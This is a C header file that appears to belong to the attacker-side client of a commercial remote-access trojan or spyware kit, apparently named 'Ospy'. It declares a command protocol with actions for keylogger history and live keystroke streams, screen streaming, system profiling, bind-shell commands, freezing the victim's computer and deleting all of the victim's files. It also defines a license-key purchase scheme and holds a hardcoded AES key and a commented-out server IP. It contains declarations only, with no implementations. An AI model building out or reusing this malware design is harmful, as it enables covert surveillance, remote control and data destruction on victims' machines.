#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <stdint.h>
#include <time.h>

#define MTU 1024
#define PORT 50007
#define SERVER_IP "127.0.0.1"
//#define SERVER_IP "37.142.255.229"

#define AES_KEY "PASS_AES_KEY" // obfuscate it !!!  lol
#define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)

#define HASH_LEN 34
#define MAX_PASSWORD_LEN 16
#define MAX_USER_NAME_LEN 32
#define MAX_KEYSTROKE_LEN 20
#define LICENSE_KEY_LENGTH 20
#define MAX_BIND_SHELL_COMMAND 500

typedef enum {
	ATTACKER,
	VICTIM
} sender;

typedef enum {
	LOG_IN,
	REGISTER,
	BUY_LICENSE_KEY,
	SELECT_VICTIM,
	GET_CONNECTED_VICTM,
	GET_KEYLOGGER_HISTORY, 
	GET_KEYSTROKES_STREAM,
	STOP_KEYSTROKES_STREAM,
	GET_SCREEN_STREAM,
	STOP_SCREEN_STREAM,
	GET_SYSTEM_PROFILER,
	SEND_BIND_SHELL_COMMAND,
	STUCK_VICTIMS_COMPUTER,
	DELETE_VICTIMS_ALL_FILES,
	GET_VICTIM_PAYLOAD,
} action_type;

typedef enum {
	CONNECTION_SUCCESS,
	CONNECTION_FAILURE
} CONNECTION_STATUS;

typedef enum {
	FILE_RECEIVED,
	FAILED_RECEIVING_FILE
} FILE_RECEIVING_STATUS;

int attacker_socket; // global value

//protocols//

typedef struct {
	char username[MAX_USER_NAME_LEN];
	char password[MAX_PASSWORD_LEN];
} log_in_protocol;

typedef struct {
	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
} encrypted_log_in_protocol;


typedef struct {
	char username[MAX_USER_NAME_LEN];
	char password[MAX_PASSWORD_LEN];
	char license_key[LICENSE_KEY_LENGTH];
} register_protocol;

typedef struct {
	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
	char license_key[LICENSE_KEY_LENGTH];
} encrypted_register_protocol;


typedef struct {
	char username[MAX_USER_NAME_LEN];
	char password[MAX_PASSWORD_LEN];
} buying_license_key_protocol;

typedef struct {
	char username[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	char password[ENCRYPTED_TEXT_LEN(MAX_PASSWORD_LEN)];
} encrypted_buying_license_key_protocol;


typedef struct {
	char file_sub_buffer[MTU];
	int end_of_file;
} file_transformation_protocol;

typedef union{
	log_in_protocol login_to_Ospy;
	register_protocol register_to_Ospay;
	buying_license_key_protocol buy_license_key;
	char keylogger_stream_key[MAX_KEYSTROKE_LEN];
	char bind_shell_command[MAX_BIND_SHELL_COMMAND];
	char selected_victim_name[MAX_USER_NAME_LEN];
	file_transformation_protocol file_data;
} main_data;

typedef union{
	encrypted_log_in_protocol encrypted_login_to_Ospy;
	encrypted_register_protocol encrypted_register_to_Ospay;
	encrypted_buying_license_key_protocol encrypted_buy_license_key;
	char keylogger_stream_key[ENCRYPTED_TEXT_LEN(MAX_KEYSTROKE_LEN)];
	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
	file_transformation_protocol file_data;
} encrypted_main_data;
//protocols //

typedef struct {
	action_type action;
	main_data data;
} general_message_protocol;

typedef struct {
	sender i_am;
	action_type action;
	encrypted_main_data data;
} encrypted_general_message_protocol;

CONNECTION_STATUS create_connection();
void A_2_S_encrypted_message_handler(main_data data, action_type action);
void recv_file_and_print_it();
FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * file_extension, char * attacket_type);
char * remove_spaces_from_time (char * curr_time);
char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
char * decrypt_text (char * text_to_decrypt, char * decryption_key);